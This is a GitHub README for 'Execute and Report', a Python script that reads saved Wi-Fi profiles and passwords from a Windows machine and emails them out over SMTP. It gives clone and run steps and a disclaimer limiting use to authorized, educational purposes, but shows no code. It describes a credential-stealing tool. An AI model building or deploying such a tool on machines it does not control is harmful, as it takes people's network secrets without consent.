## Execute and Report

A Python script that retrieves saved Wi-Fi profiles and passwords on a Windows machine, then emails the results to a specified address.

### Features

- Executes a system command to access saved Wi-Fi profiles
- Extracts and emails Wi-Fi profile data to a specified address

### Usage

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Daniel-Ikenna/execute_and_report
   ```

2. **Configure Email Settings**:
   - Replace `sender's_email` and `sender's_email_password` in the script with the sender’s email credentials.
   - This example uses an Office365 SMTP server (`smtp.office365.com`). Adjust the SMTP settings as needed based on your email provider.

3. **Run the Script**:
   ```bash
   python execute_and_report.py
   ```

### Requirements

- Python 3.x
- `smtplib` library (included with Python)

### Important Note

This tool is intended solely for authorized and educational purposes. Unauthorized use on machines you do not own or manage is strictly prohibited.

### Authors

- [Zaid Sabih](https://ie.linkedin.com/in/zaid-sabih-al-quraishi-5444a6127)
- [Uzoeshi Daniel](https://www.linkedin.com/in/daniel-ikenna-33b709235)
